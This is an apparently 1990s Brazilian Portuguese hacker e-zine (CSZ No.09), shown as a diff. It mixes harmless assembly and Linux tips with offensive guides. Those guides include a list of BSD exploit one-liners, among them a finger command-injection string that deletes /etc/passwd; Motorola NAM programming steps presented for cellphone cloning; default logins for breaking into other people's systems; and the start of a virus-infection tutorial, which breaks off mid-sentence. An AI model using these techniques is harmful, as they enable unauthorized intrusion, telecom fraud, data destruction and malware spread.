@@ -1,0 +1,992 @@
+			CCCCCCCC  SSSSSSSS  ZZZZZZZZ
+			CC	  SS	     ZZ
+			CC	  SS	      ZZ
+			CC	  SSSSSSSS     ZZ
+			CC		SS	ZZ
+			CC		SS	 ZZ
+			CCCCCCCC  SSSSSSSS  ZZZZZZZZ
+
+			   CSZ - Cheat Struck Zine
+				by Cheat Struck
+
+				       No.09
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ Indice $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+Seção:	Matéria:		Assunto:		Autor:		Nota:
+
+1.	Introdução		CSZ No.09		Cheat Struck	---
+2.	Programação		Int's e fontes para ASM	Cheat Struck	9,0
+3.	Bugz			Lista de bugz no BSD	Cheat Struck	7,5
+4.	Hacking para iniciantes	Dicas para LINUX	Cheat Struck	8,5
+5.	Phreaking		Telefonia Celular	Cheat Struck	9,5
+6.	Invasão de privacidade	Invadindo sistemas BSD	Cheat Struck	9,0
+7.	VIRII			Passos do virus		Cheat Struck	10,0
+8.	Crackerz		Modificando COMMAND.COM	Cheat Struck	9,5
+9.	Hack, the Art		Backdoor's simples	Cheat Struck	9,5
+10.	Preview
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 1. Introdução $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Hellow DooD'z!!!
+	Estou com muitos trabalos aki para fazer por isso não garanto a mes-
+ma agilidade e rapidez na entrega dos zines.  Para quem ainda não sabe este
+zine é entregado por mim mesmo e alguns parceiros meus no IRCserver via-rs.
+	Estou com dificuldades na elaboração da minha page. Por isso por em-
+quanto o zine é distribuido apenas via DCCsend nos IRCroom's #hackers e
+#senhas. Talvés ainda saia o #CSCHANNEL, mas não é certo.
+	Outra coisa: estou trabalhando em 2 tutoriais, CSM-CSManual definido
+de hacking, e HACK the Book. Ambos ensinam as melhores técnicas de hacking
+detalhadamente. O HACK the Book é tipo uma coletanea das melhores matérias q
+eu já encontrei na inet. O outro eu estou detalhando as técnicas já usadas
+por mim na hora de hackear. Modestia parte, estão muito bons.
+	Este numero do zine está bem bom tb, inclusive com um tutorial que eu
+mesmo escrevi, mostrando os primeiros passos de um virus. E lah no finzinho
+do zine você vai encontrar um BONUS especial com uma lista TOP10 onde você
+verá os melhores materiais de hacking que vc pode encontrar na inet.
+	Hahh!! Eu ouvi muito babaca na IRC dizendo que eu apenas copiei maté-
+ria dos outros zines mais importantes como Axur05, Hack and Phreak, Nethack,
+etc... Pois eu quero que todos saibam que eu não estou copiando matéria de
+zine algum. Se apareceu lah alguma coisa que tá parecida com o que você en-
+controu aki é pura coinsidencia, pois aki no Underworld as coisas que publi-
+camos as vezes saem parecidas. Tipo: Agora mesmo eu estava lendo a H n' P 03
+e ví que lah no zine deles(que a meu respeito é um dos melhores) eles inaugu-
+raram uma seção chamada VIRII, é igual a minha. Isso é apenas uma coinsiden-
+cia, pois eu jah fazia esta seção desda edição numero 1. E eu não acho que
+eles devem ter me copiado por que eu conheço um pouco do pessoal que escreve
+o zine e acho que nem leram o meu ainda. Mas e' só pra cambada de lamer ficar
+sabendo que eu não vou abrir mão do zine pq 1 ou 2 coisas ficaram parecidas
+com a dos outros. E NÃO ME ENCHAM MAIS O SACO!!!!!!!!!!
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 2. Programação $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	É,eu sei que prometi um tutorial de assembly para essa seção. Mas...
+eu to sem o menor saco para escreve-lo. Chegei a começar, acabei na metade da
+lista das funções das interrupções.
+	Mas o que vcs tem que saber é que EU NÃO ACABEI O TUTORIAL E NÃO VOU
+PUBLICA-LO INCOMPLETO!!! Porém vou colocar aki nessa seção, as interrupções
+mais usadas e suas funções, e tb ums fontes bem simples, para vcs irem estu-
+dando.
+
+-----teclado(int 16h)----
+mov ah, 00h			; lê um caracter do teclado
+int 16h				; (Teclado)
+
+mov ah, 01h			; lê estado atual do teclado
+int 16h 			; (Teclado)
+
+-----video(int 10h)-----
+mov ah, 02h			; seleciona a posição do cursor
+mov BH, XXh			; XX = pagina de video
+mov DH, XXh			; XX = linha
+mov DL, XXh			; XX = coluna
+int 10h 			; (video)
+
+mov ah, 09h			; exibe um caracter na posição do cursor
+mov AL, XXh			; XX = caracter a exibir
+mov BH, XXh			; XX = pagina de video
+mov BL, XXh			; XX = atributo do caracter
+mov CX, XXh 			; XX = Numero de repetições
+int 10h 			; (video)
+
+mov ah, 0Ah			; exibe um caracter na posissão do cursor
+mov AL, XXh			; XX = Caracter a exibir
+mov BH, XXh			; XX = Pagina de video
+mov BL, XXh			; XX = Cor do caracter
+mov CX, XXh			; XX = Numero de repetições
+int 10h 			; (video)
+
+mov ah, 6Ah			; 800x600
+int 10h 			; (video)
+
+mov ah, 07h			; 80x25
+int 10h 			; (video)
+
+-----MS-DOS (int 21h)-----
+mov ah, 01h			; entrada do teclado
+int 21h				; (dos)
+
+mov ah, 02h			; imprimir um caractere
+mov DL, XXh			; XX = Valor a ser mostrado.
+int 21h				; (dos)
+
+MOV AH, 09h			; imprimir cadeia de caracteres
+MOV DX, XXh			; XX = inicio da cadeia
+MOV CX, XXh			; XX = Qts vezes será mostrada
+int 21h				; (dos)
+
+mov ah, 3Ch			; Criação de file
+mov CX, XXh			; XX = 00(Normal), 02(Oculto), 04(System), 06
+				; (Oculto e System)
+int 21h				; (dos)
+
+mov al, 4Ch			; sai para o dos
+int 21h				; (dos)
+
+------impressora(int 17h)-----
+mov ah, 00h			; imprime um valor ascii
+mov AL, XXh			; XX = caracter a imprimir
+mov DX, XXXXh			; XXXX = porta de conexão
+int 17h				; (impressora)
+
+mov ah, 01h			; seta uma porta paralela da impressora
+mov DX, XXXXh			; XXXX = porta
+int 17h				; (impressora)
+
+mov ah, 02h			; lê estado da impressora
+mov DX, XXXXh			; XXXX = porta
+int 17h				; (impressora)
+
+portas:
+lpt1=0
+lpt2=1
+e assim por diante...
+
+			FONTE DE PROGRAMAS PARA DEBUG
+
+------modelo1.COM------------------------------------------------------------
+mov al, 6A		; al = 64
+int 10			; função 64(800x600) no video
+mov al, 4C		; al = 4c
+int 21			; função 4c(sai pro dos) no dos
+-----------------------------------------------------------------------------
+
+------modelo2.com------------------------------------------------------------
+MOV AX,0006    ; AX = 0006
+MOV BX,0004    ; BX = 0004
+ADD AX,BX      ; 0006(AX) + 0004(BX) = A
+INT 20         ; Finaliza o Programa
+-----------------------------------------------------------------------------
+
+------modelo3.com------------------------------------------------------------
+- a100
+jmp 125 	;Salta para o endereço 125h
+[Enter]
+- e 102  'Hello, How are you ?' 0d 0a '$'
+- a125
+MOV DX,0102 ; DX = string
+MOV CX,000F ; string será mostrada F(15) vezes.
+MOV AH,09   ; função 09
+INT 21      ; (dos)
+DEC CX      ; 000F(CX) - 1 = 000E
+JCXZ 0134   ; Se CX = 0 salta para o endereço 0134
+JMP 012D    ; Salta ao endereço 012D
+INT 20      ; Finaliza o programa
+-----------------------------------------------------------------------------
+
+------modelo4.com------------------------------------------------------------
+MOV     AH,01    ;Função para mudar o cursor
+MOV     CX,0007  ;Formata o cursor
+INT     10       ;Chama interrupção do BIOS(video)
+INT     20       ;Finaliza o programa
+-----------------------------------------------------------------------------
+
+------modelo5.com------------------------------------------------------------
+MOV     AH,01    ;Função 1 (lê caractere do teclado)
+INT     21       ;Chama interrupção do DOS
+CMP     AL,0D    ;Compara se o caractere lido é um ENTER
+JNZ     0100     ;Se não é, lê um outro caractere
+MOV     AH,02    ;Função 2 (escreve um caractere na tela)
+MOV     DL,AL    ;Character to write on AL
+INT     21       ;Chama interrupção do DOS
+INT     20       ;Finaliza o programa
+-----------------------------------------------------------------------------
+
+			FONTES DE PROGs PARA TASM E TLINK
+
+------one.asm----------------------------------------------------------------
+;nome do programa: one.asm
+;
+.model small
+.stack
+.code
+   mov AH,1h       ;Função 1 do DOS
+   Int 21h         ;lê o caracter e retórna o código ASCII ao registrador AL
+   mov DL,AL       ;move o código ASCII para o registrador DL
+   sub DL,30h      ;subtrai de 30h para converter a um digito de 0 a 9
+   cmp DL,9h       ;compara se o digito est  entre 0 e 9
+   jle digit1      ;se verdadeiro obtém o primeiro número (4 bits)
+   sub DL,7h       ;se falso, subtrai de 7h para converter a uma letra A-F
+digit1:
+   mov CL,4h       ;prepara para multiplicar por 16
+   shl DL,CL       ;multiplica para converter dentro dos 4 bits mais altos
+   int 21h         ;obtém o próximo caracter
+   sub AL,30h      ;repete a operação de conversão
+   cmp AL,9h       ;compara o valor 9h com o conte£do do registrador AL
+   jle digit2      ;se verdadeiro, obtém o segundo digito
+   sub AL,7h       ;se falso, subtrai de 7h
+digit2:
+   add DL,AL       ;adiciona o segundo digito
+   mov AH,4Ch      ;funçãoo 4Ch do DOS (exit)
+   Int 21h         ;interrupção 21h
+   End             ;finaliza o programa
+-----------------------------------------------------------------------------
+
+	Ok. Vamos ficar por aki. Todos os programas aki foram testados e es-
+critos por mim, então não me venha com essa de não funciona.
+	Vou ficar devendo alguns progs para TASM por que eu ainda tenho que
+escrever as outras seções.
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$ 3. Bugz $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	BSD é um bug vivo! Não tem uma versão dele que não venha bugzada por
+isso estou colocando essa matéria aki pra vcs encontrarem os bugz.
+
+Versão:		 Bug(descrição):
+
+BSD 4.1          mail directly to a file ()
+BSD 4.1          exec sgid program, dump core, core is sgid ()
+BSD 4.1          lock -- compiled in password "hasta la vista" ()
+BSD <4.2         IFS w/ preserve bug w/vi ()
+BSD <4.2         suspend mkdir, ln file you want to dir ()
+BSD 4.2          lock -- compiled in password "hasta la vista" ()
+BSD 4.2          ln passwd file to mail spool, mail to user file ()
+BSD 4.2          can truncate read only files ()
+BSD 4.2          finger "string|/bin/rm -f /etc/passwd"@foo.bar ()
+BSD 4.2          ln -s target ~/.plan; finger user to read file ()
+BSD 4.2          lpr file; rm file; ln -s /any/filename file ()
+BSD 4.2          adb su; change check in memory; shell out ()
+BSD 4.2          race condition, can get root via "at" ()
+BSD 4.3          ftp -n; quote user ftp; cd ~root, get root priv ()
+BSD 4.3          lpd can overwrite file ()
+BSD 4.3          ln -s /any/suid/file -i ; -i        Get suid shell ()
+BSD 4.3          fchown (2) can chown _any_ file ()
+BSD 4.3          race condition (expreserve?), root via "at" ()
+BSD 4.3          passwd chokes on long lines, splits pw file ()
+
+	Atenção!!! Estes bugz foram retirados da Holelist de 93 por isso pode
+estar meio desatualizada.
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 4. Hacking para iniciantes $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Chega de enrolação!!! Já estamos na edição numero 09 e se você ainda
+naum instalou o seu UNIX, bem... Não me venha dizer que não sabia que você
+devia instala-lo, pois desde a edição numero 0(zero) eu estou dizendo para vc
+ir conseguindo o LINUX com algum amigo ou compra (quer molesa come merda que
+não tem osso).
+       Apartir de agora tudo o que eu ensinar aqui será dirigido aos usuários
+de UNIX(tanto faz se é LINUX, SunOS, AIX). Isso porque você tem que aprender
+que nunca será um hacker se não usar um S.O. bom na sua conexão.
+	Aí se diz: "Mas eu não quero ser hacker". Então porque está lendo ese
+zine?? Para aranjar informações sobre o assunto, Apenas?? Bem mas de qualquer
+forma eu recomendo que você instale o seu unix.
+	Aki vai uma série de dicas que serão extremamente úteis na hora de
+usar o seu UNIX.
+
+==================1. Como eu Acesso um disquete no LINUX ??==================
+
+	Vá para o diretório /dev, de um ls e vc verá varios dispositiveis do
+seu computador. Entre eles está o fd0 que corresponde ao seu drive de disqte.
+Então use o comando mount para montar esse dispositivo em um diretório. Como?
+Bem, o comando deve estar nessa sintaxe:
+
+# mount /dev/fd0 /diretório
+
+	Onde diretório é o diretório onde quer que o disquete seja montado.
+Atenção! O diretório especificado tem que existir.
+
+=================2. Como eu acesso a internet com o LINUX ??=================
+
+	Antes de mais nada crie um script chamado connect.
+	Para isso digite:
+
+echo pppd /dev/modem 115200 >> /bin/connect
+chmod a+x /bin/connect
+
+	Pronto?? Não...
+	O linux tem um progaminha,  chamado minicom,  que seve para acessar a
+redes. Antes de roda-lo você precissa ver se o seu modem já está linkado. Pra
+isso vá ao dir /dev e digite "ls modem".
+	Se não aparecer o link modem faça o seginte:
+1. Veja em que porta o seu modem está conectado. Se não souber fazer isso vá
+   para o inferno.
+2. As portas COM no linux são mostradas assim:
+cua0   	=   	COM1
+cua1	=	COM2
+cua2	=	COM3
+cua3	=	COM4
+3. Então agora digite:
+
+ln /dev/(porta) /dev/modem
+
+	Bem agora que você linkou a porta do seu modem digite minicom para
+entrar no programa. Tecle Ctrl+A depois largue e aperte Z para entrar no menu
+de ajuda. Tecle O para entrar nas configurações. Configure direitinho o seu
+modem, depois volte a tela principal do minicom.
+	Aki vai uma pequena lista de comandos para o modem que você usará no
+prog para se conectar.
+
+at e0		=	não mostra o que vc está digitando.
+at e1		=	vêr o que vc está digitando.
+at l#		=	volume. Onde # é a intensidade.
+at s7=##	=	Tempo que o modem esperará até que o outro de sinal.
+			Onde ## é o tempo em segundos.
+at s0=0		=	O modem não responderá a nenhuma ligação.
+at s0=1		=	O modem responderá a todas as ligações.
+at dp#######	=	Discagem por pulse. Onde ####### é o numero do phone.
+at dt#######	=	Discagem por tone. Onde ####### é o numeor do phone.
+
+	Já entendeu né? Não? então ai vai os comandos:
+
+atdp No.-do-seu-provedor
+(digite o login)
+(digite a senha)
+(digite ppp se pedir o tipo de conexão)
+(tecle Ctrl+A depois solte e tecle Z)
+(tecle Q para sair do programa)
+# connect
+(lembra daquele script que vc fez??)
+
+	Agora sim. Se tudo deu certo, você está online.
+	Dá próxima vez que quizer se conectar é só entrar no minicom e seguir
+os passos acima(apartir do atdp No.-do-seu-servidor).
+
+====================3. Tá e agora?? Que programas eu uso??===================
+
+	Para navegar via ftp use o ftp.
+	Para WWW use o lynx.
+	Para mandar e-mails use o sendmail.
+	E para Chats use o bitchx. Esse talvéz não venha acompanhado com o
+linux mas você pode consegui-lo no http://www.sasknet.com/~pionh/index.htm.
+
+>>>»»»4. Gravei uns txts no WINDOWS. Não tem como visualisa-los no UNIX?««<<<
+
+	Sim. Para isso você deve mountar a unidade do windows em um diretório
+do LINUX. As unidades de Hard Disk são:
+hda1	=	1o HD(Normalmente o do Windows)
+hda2	=	2o HD(normalmente a partição pro Linux)
+hda3	=	3o HD(normalmente o segundo hd ou outra partição)
+e assim por diante, dependendo de quantas HD's vc tem ou quantas partições vc
+fez...
+	Então digite:
+
+# mount /dev/hda1 /diretório
+
+	Isso claro se o seu Win estiver no primeiro HD. Onde o /diretório é
+o diretório onde vc irá montar o 1o HD.
+
+=========5. Como faço para estabelecer uma conexão ppp com um amigo??========
+
+	Primeiro faça uma conta para ele. Digite:
+
+# adduser login
+
+	Onde login é o login dele. Depois indique a senha.
+	Agora fale com ele e diga o seu login e senha e diz pra ele usar o
+minicom para ligar pra você.
+	Entre no programa minicom e digite:
+
+at s0=1
+
+	Isso fará com que o modem responda a ligaçào do seu amigo.
+	Agora ele digitará o login e a senha que vc indicou e ping.
+	Para vêr se ele está conectado, saia do prog minicom e digite who, se
+o login dele aparecer é que ele está conectado a sua maquina.
+	Aki vão alguns comandos para facilitar o seu contato com seu amigo.
+
+who		=	mostra quem está online
+w		=	idem
+finger $$$	=	mostra info sobre o $$$(login do user).
+write $$$	=	Abre chat com $$$(login do user).
+sz		=	Envia via Zmodem
+rz		=	Recebe via Zmodem
+sx		=	Envia via Xmodem
+rx		=	Recebe via Xmodem
+sb		=	Envia via Ymodem
+rb		=	Recebe via Ymodem
+umodem		=	Envia/Recebe via Umodem
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 5. Phreaking $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Vamos acabar lógo com essa lista de comandos para a programação(que
+já está ocupando edições de mais). aki vão 5 comandos. Depois desses faltam
+ainda 18 e pronto! A lista inteira e o melhor: Em PORTUGUÊS!!!
+
+--------Lista de comandos para TESTMODE em celulares Motorola (parte5)-------
+
+51#  Teste de movel onde converte os dados que são transmitidos e mostra de
+     volta. Exibe da seguinte maneira:
+     PASS = dados corretos
+     FAIL1= dados não transmitidos, espere mais 2 segundos
+     FAIL2= dados incorretos
+
+52*# Ajustamento fase SAT. Aki estão os valores que pode assumir. Não entre
+     com nenhum valor que não esteja na lista abaixo.
+
+     0 degrees = 0          121.5 degrees = 59           243.0 degrees = 86
+     4.5       = 1          126.0         = 60           247.5         = 87
+     9.0       = 2          130.5         = 61           252.0         = 112
+     13.5      = 3          135.0         = 62           256.5         = 113
+     18.0      = 4          139.5         = 63           261.0         = 114
+     22.5      = 5          144.0         = 40           265.5         = 115
+     27.0      = 6          148.5         = 41           270.0         = 116
+     31.5      = 7          153.0         = 42           274.5         = 117
+     36.0      = 16         157.5         = 43           279.0         = 118
+     40.5      = 17         162.0         = 44           283.5         = 119
+     45.0      = 18         166.5         = 45           288.0         = 120
+     49.5      = 19         171.0         = 46           292.5         = 121
+     54.0      = 20         175.5         = 47           297.0         = 122
+     58.5      = 21         180.0         = 64           301.5         = 123
+     63.0      = 22         184.5         = 65           306.0         = 124
+     67.5      = 23         189.0         = 66           310.5         = 125
+     72.0      = 48         193.5         = 67           315.0         = 126
+     76.5      = 49         198.0         = 68           319.5         = 127
+     81.0      = 50         202.5         = 69           324.0         = 104
+     85.5      = 51         207.0         = 70           328.5         = 105
+     90.0      = 52         211.5         = 71           333.0         = 106
+     94.5      = 53         216.0         = 80           337.5         = 107
+     99.0      = 54         220.5         = 81           342.0         = 108
+     103.5     = 55         225.0         = 82           346.5         = 109
+     108.0     = 56         229.5         = 83           351.0         = 110
+     112.5     = 57         234.0         = 84           355.5         = 111
+     117.0     = 58         238.5         = 85           360.0         = 70
+
+53#  habilita a opção scrambler.
+
+54#  Disabilita a opção scrambler.
+
+55#  Mostra/Programa o N.A.M. (Programação no Test Mode). Atenção! Isso é
+     muito, MUITO importante para a clonagem de celulares. Lêia com atenção.
+
+	O texto retirado da biblia dos celulares motorola ficará meio confuso
+se eu não esclarecer esses detalhes antes:
+	NAM(Number Assigment Module) é um componente onde ficam armazenados
+o ESN(Electronic Serial Number), MIN(Numero do telefone), SCM(Station Class
+Mark), lock code(codigo do aparelho) etc... Ele é totalmente programavel,
+porém em alguns aparelhos(mais antigos) é precisso de um certo sofhware espe-
+cial para programa-los, em outros casos(como esse) ele pode ser programado
+pelo próprio teclado numerico do celular.
+	O ESM é a "indentidade" do celular,  é burlando o ESM que nós conse-
+guiremos clonar o celular.
+
+     _____PROGRAMAÇÃO DO NAM_____
+	Para entrar digite 55# no TEST MODE. Aki está as teclas que vc usará.
+
+TECLA:				FUNÇÃO:
+^^^^^^				^^^^^^^
+* 				Avansa para o próximo passo.
+				NOTA: No modo de programação não aparece o
+				numero do passo.
+
+CLR 				Volta um passo atrás.
+
+# 				Sai do modo de programação.
+
+     _____PROGRAMAÇÃO DE DADOS em Celulares AMPS e NAMPS_____
+	Vejamos as coisas mais importantes apenas.
+
+PASSO 01 (System ID)
+	Entrada de 00000 - 32767
+
+PASSO 02 (Opção de programação)
+	Entrada de 8 digitos binarios.
+	Sugiro entrar com: 11101001 para o sistema "A"
+			   10101001 para o sistema "B".
+
+	 1 Digito: Local. Deixe como 1.
+	 2 Digito: Sistema (1 para o sistema A e 0 pro B).
+	 3 Digito: DTMF (1 para habilitar). Deixe como 1.
+	 4 Digito: Teste móvel. Não use (coloque 0).
+	 5 Digito: Chamada Repertória (1 para habilitar). Coloque 1.
+	 6 Digito: Alerta Auxiliar (1 para habilitar). Coloque 0
+	 7 Digito: Auto mute (1 para habilitar). Fica mudo sempre que você
+		   aperta alguma tecla. Coloque 0
+	 8 Digito: Marca MIN (1 para habilitar). Coloque 1
+
+PASSO 03 (MIM)
+	Entrada de 10 digitos: DDD-TLPHONE
+
+PASSO 04 (Station Class Mark)
+	Entrada de 2 digitos
+
+	  SCM | Ch. 666 ou 832 | VOX | Força Max
+	 -----+----------------+-----+-----------
+	   00 |      666       |  N  |   3.0 W
+	   01 |      666       |  N  |   1.2 W
+	   02 |      666       |  N  |   0.6 W
+	   03 |                |     |
+	   04 |      666       |  Y  |   3.0 W
+	   05 |      666       |  Y  |   1.2 W
+	   06 |      666       |  Y  |   0.6 W
+	   07 |                |     |
+	   08 |      832       |  N  |   3.0 W
+	   09 |      832       |  N  |   1.2 W
+	   10 |      832       |  N  |   0.6 W
+	   11 |                |     |
+	   12 |      832       |  Y  |   3.0 W
+	   13 |      832       |  Y  |   1.2 W
+	   14 |      832       |  Y  |   0.6 W
+	   15 |                |     |
+
+PASSO 07 (LOCK CODE)
+	Entrada de 3 digitos. Para verificar o seu fora do test mode tecle:
+
+FCN + 0 + SECURITY CODE + RCL
+
+PASSO 09 (Nível do Serviço)
+	Entrada de 3 digitos. Aqui estão os códigos:
+
+001   Fraco - O telefone não aceitará entradas pelo teclado.
+002   Fraquissima - O telefone não aceitará entradas pelo teclado e disativa-
+      rá a super velocidade na discagem.
+003   Médio - O teclado só servirá para discar.
+004   Padrão - Discagens pelo teclado e pela memoria ilimitadas.
+005   Médio - Discagem para apenas 7 digitos.
+006   Bom - Todo o teclado e memoria, mas apenas 1 locação de memoria.
+007   Bom - O phone irá discar apenas para as 50 programações da memoria.
+
+PASSO 10 (Opção de programação)
+	Entrada de 8 digitos binarios.
+	Sugiro entrar com: 00000100
+
+	 1 - 3 Digito : Não é usado no Brasil nem nos EUA, entre com 0.
+	 4 Digito: Scaneia mais de 32 paginas de canais. 0 disabilita.
+	 5 Digito: Sistema de scaneamento sinples (1 para habilitar).
+	 6 Digito: Chamada Super veloz (1 para habilitar).
+	 7 Digito: Serviço do nível do usuário (0 para habilitar)
+	 8 Digito: Função de trancar (0 para habilitar)
+
+PASSO 11 (Opção de programação)
+	Entrada de 8 digitos binarios.
+	Sugiro que entre com: 00000000
+
+	 1 Digito: Handset speaker interno (0 para habilitar).
+	 2 Digito: Segundo numero do phone (1 para habilitar).
+	 3 Digito: Chama o tempo de acesso (0 para habilitar).
+	 4 Digito: Auto Rediscagem (0 para habilitar).
+	 5 Digito: Speaker Interno (1 para habilitar).
+	 6 Digito: IMTS/Cellular (1 para habilitar, é raro)
+	 7 Digito: Sistema de Registro do usuário (0 para habilitar).
+	 8 Digito: Antena Dupla (1 para habilitar). Não tem em todos.
+
+PASSO 12 (Página inicial do canal)
+	Entrada de : 0333
+		     0334
+
+PASSO 16 (Opção de Programação)
+	Entrada de 8 digitos binarios.
+	sugiro que entre com: 00110010 para portateis
+			      00110011 para unidades móveis
+
+	 1 Digito: Enhanced Scan (1=habilita, 0=desabilita).
+	 2 Digito: Conexão do Celular (0=seriesII, 1=seriesI, 0 em todos os
+		   phones TDMA).
+	 3 Digito: DTMF continuo (1 para habilitar).
+	 4 Digito: Ringer/Speaker transportavél, 0=Transducer, 1=Handset.
+	 5 Digito: 8 horas fora do modo transportavel, 0 para habilitar.
+	 6 Digito: Não é usada, coloque apenas 0.
+	 7 Digito: Idicador de falha na página (0 para habilitar).
+	 8 Digito: Scaneador Portatíl (0 para portatíl, 1 para unid móveis).
+
+     OS passos 01 à 06 e 12 serão repetidos pelo NAM se o segundo possuir o
+segundo numero do phone (PASSO 11, 2o. digito).
+
+     _____PROGRAMAÇÃO DE DADOS em Celulares TDMA_____
+
+	São praticamente os mesmos passos:
+
+AMPS/NAMPS				TDMA
+^^^^^^^^^^				^^^^
+PASSO 01		=		PASSO 01
+PASSO 02		=		PASSO 02
+PASSO 03		=		PASSO 03
+PASSO 04		=		PASSO 04
+PASSO 07		=		PASSO 08
+PASSO 09		=		PASSO 09
+PASSO 10		=		PASSO 10
+PASSO 11		=		PASSO 11
+PASSO 12		=		PASSO 12
+PASSO 16		=		PASS0 19
+
+--------Fim da parte 5-------------------------------------------------------
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$ 6. Invasão de Privacidade $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Para entrar em sistemas alheios você pode contar muitas vezes com o
+login test. Ele fica ativo porque em muitas ocasioes o administrador está
+querendo fazer apenas um teste com o seu sistema.
+	Essa conta tem um UID e GID altos o bastante para editar o arquivo
+/etc/passwd e fazer backdoor's ou pegar as contas para descripta-las.
+	A conta é:
+
+Login : test
+Senha : test
+
+	Outras contas que as vezes tb ficam expostas são:
+
+Login : games
+Senha : games
+
+Login : user
+Senha : user
+
+Login : guest
+Senha : guest
+
+	Após testa-las, e não funcionar tente comandar o login e conseguir o
+Login dos usuários conectados.
+	Mas, como se comanda o login??? Quando você encontrar o pedido de lo-
+gin para o sistema tente esses comandos:
+
+rwho
+finger
+who
+
+	Eles mostrarão os logins dos users on-line. Muitas vezes o usuário
+usa a mesma senha como login. Essas "falhas" eu encontrei nos sistemas BSD,
+que são na certa os mais bugzados encontrados na rede(Mais que AIX).
+	Talvéz tb funcionem em sistemas SunOS's.
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 7. VIRII $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Bem... Nós jah sabemos os tipos de virus existentes, sabemos o que
+são trojans, sabemos o que são virus, e sabemos programar em ASSEMBLY(a lin-
+guagem mais usada para fazer virus). Então, o que estamos esperando???
+	Vamos começar o aprendizado à "Criação de Virus".
+
+----------Manual-de-Criação-de-Virus-by-Cheat-Struck-------------------------
+
+	Não Vamos erolar muito e vamos direto ao que enteressa.
+	Veremos nessa primeira parte do tutorial, os 3 primeiros passos que
+o virus deve seguir: A hospedagem, a infectação e encobrir a infectação.
+
+[[[[[ HOSPEDAGEM ]]]]]
+
+	Vejamos o nosso esquema:
+
+1.
+.---------.  .-----------.
+| Arquivo |  |   Virus   |
+'---------'  '-----------'
+
+	Aqui nos temos o Arquivo que será infectado(um .COM) e o virus.
+
+2.
+.---------.		.----+----.
+| Arquivo |	=	| P1 | P2 |
+'---------'		'----+----'
+
+.-----------.		.----+------.
+|   Virus   |	=	| V1 |  V2  |
+'-----------'		'----+------'
+
+	Dividimos o Arquivo a ser infectado em 2 partes(P1 e P2). E fazemos
+o mesmo com o Virus. Note que na divisão o P1 é igual ao V1, porém o P2 não
+precissa ser igual ao V2.
+
+3.
+.----+----+----.		.---------.
+| P1 | P2 | P1 |	=	| Arquivo |
+'----+----+----'		'---------'
+
+	Copiamos a Parte1(P1) do arquivo para o seu final.
+
+4.
+.----+----+----.		.---------.
+| V1 | P2 | P1 |	=	| Arquivo |
+'----+----+----'		'---------'
+
+	Copiamos a parte 1(V1) do virus para o inicio do arquivo, em cima da
+Parte 1(P1) Original do arquivo.
+
+5.
+.----+----+----+------.			.-------------------.
+| V1 | P2 | P1 |  V2  |		=	| Arquivo infectado |
+'----+----+----+------'			'-------------------'
+
+	Finalmente copiamos a segunda parte(V2) do virus para o final do ar-
+quivo. Pronto! O arquivo foi infectado.
+	Note que o Arquivo infectado é maior do que o arquivo inicial(limpo).
+	A primeira parte(V1) do virus, nada mais faz do que chamar a segunda
+parte(V2) dele, onde está toda a função.
+
+	Essa seria uma "Entrada" quase sem erros e bem detalhada. Porém o
